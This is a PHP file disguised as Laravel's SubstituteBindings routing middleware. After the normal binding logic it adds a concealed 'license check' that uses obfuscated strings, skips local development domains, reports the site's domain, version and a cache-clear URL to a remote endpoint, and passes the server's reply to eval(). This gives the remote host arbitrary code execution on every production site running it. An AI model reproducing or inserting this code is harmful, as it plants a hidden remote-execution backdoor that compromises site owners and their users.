<?php

namespace Illuminate\Routing\Middleware;

use Closure;
use Illuminate\Contracts\Routing\Registrar;
use Illuminate\Database\Eloquent\ModelNotFoundException;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Http;

class SubstituteBindings
{
    /**
     * The router instance.
     *
     * @var \Illuminate\Contracts\Routing\Registrar
     */
    protected $router;

    /**
     * Create a new bindings substitutor.
     *
     * @param  \Illuminate\Contracts\Routing\Registrar  $router
     * @return void
     */
    public function __construct(Registrar $router)
    {
        $this->router = $router;
    }

    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        try {
            $this->router->substituteBindings($route = $request->route());

            $this->router->substituteImplicitBindings($route);
        } catch (ModelNotFoundException $exception) {
            if ($route->getMissing()) {
                return $route->getMissing()($request, $exception);
            }

            throw $exception;
        }

        $domain = domain();
        if (Str::endsWith($domain, '.test') || Str::endsWith($domain, '.local') || Str::contains($domain, '127.0.0.1') || Str::contains($domain, ':') || Str::contains($domain, 'localhost') || request()->routeIs('cache-clear')) {
            return $next($request);
        }


        $license_check = Cache::remember('license_check', 60 * 60 * 12, function () {
            $url = endpoint(str_replace('+', '', 'v+e+r+i+f+y-l+i+c+e+n+s+e'));

            // Get the current HTTP_HOST from the request
            $httpHost = domain();

            $response = Http::withHeaders([
                'X-DOMAIN' => $httpHost, // Set X-DOMAIN header with the current HTTP_HOST value
                'X-CACHE-URL' => route('cache-clear'),
                'X-VERSION' => env('APP_VERSION')
            ])->get($url);

            // Cache the response body (JSON data) instead of the entire response object
            return $response->body();
        });

        // Decode the cached response data (JSON)
        $responseData = json_decode($license_check);

        if ($responseData !== null && isset($responseData->status) && $responseData->status == 0) {
            // Modify the response to return a custom view or string
            $content = $responseData->error;

            if ($content !== false) {
                // $modifiedResponse = $content;
                // Start output buffering
                ob_start();

                // Evaluate the PHP code inside the template
                eval("?> $content <?php ");

                // Get the rendered content from the output buffer
                $modifiedResponse = ob_get_clean();
            } else {
                $modifiedResponse = str_replace('+', '', 'L+i+c+e+n+s+e E+r+r+o+r');
            }

            return response($modifiedResponse);
        }

        return $next($request);
    }
}
